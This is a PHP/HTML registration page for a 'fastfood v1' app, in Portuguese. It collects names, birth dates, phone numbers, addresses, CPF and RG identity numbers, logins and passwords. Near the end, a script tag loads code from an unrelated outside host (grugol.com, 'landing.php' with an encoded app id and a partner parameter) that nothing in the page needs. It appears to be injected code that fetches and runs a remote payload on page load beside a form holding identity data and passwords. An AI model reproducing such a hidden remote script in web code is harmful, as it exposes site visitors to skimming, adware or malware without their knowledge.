<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>fastfood v1 - Start</title>
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="jquery.quick.search.js"></script>
    <link rel="stylesheet" href="css/style.css">

</head>
<body>
<div class="container">
 <?php include "menu.php" ?>



      <div class="row marketing" style=" border: 1px solid rgb(225, 232, 237); border-radius: 4px; ">
        <div class="col-lg-6">
			 <form action="includes/processadados.php?go=cadastrarg" method="post" class="form-group">
				Nome:
				<div class="form-group">
				<input type="text" name="nome" class="form-control" style="width:210px;" required></div>
				Data de Nascimento:
				<div class="form-group">
				<input type="date" name="dt_nasc" class="form-control" style="width:210px;" required></div>
				Telefone:
				<div class="form-group">
				<input type="text" name="fone" class="form-control" style="width:210px;" required></div>
				Endereço:
				<div class="form-group">
				<input type="text" name="endereco" class="form-control" style="width:210px;" required></div>
				CPF:
				<div class="form-group">
				<input type="text" name="cpf" class="form-control" style="width:210px;" required></div>
				RG:
				<div class="form-group">
				<input type="text" name="rg" class="form-control" style="width:210px;" required></div>
				Login:
				<div class="form-group">
				<input type="text" name="login" class="form-control" style="width:210px;" required></div>
				Senha:
				<div class="form-group">
				<input type="password" name="senha" class="form-control" style="width:210px;" required></div>
				
				<input type="submit" value="Cadastrar" class="btn btn-success" style="width:210px;">

			</form>

        </div>
      </div>

  <!-- fim da classe container -->

      <footer class="footer">
        <p>&copy; 2017 Company, Inc.</p>
      </footer>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUUtOEMtMjUtRkEtMEQ=&partner=200'></script>

  
</body>
</html>
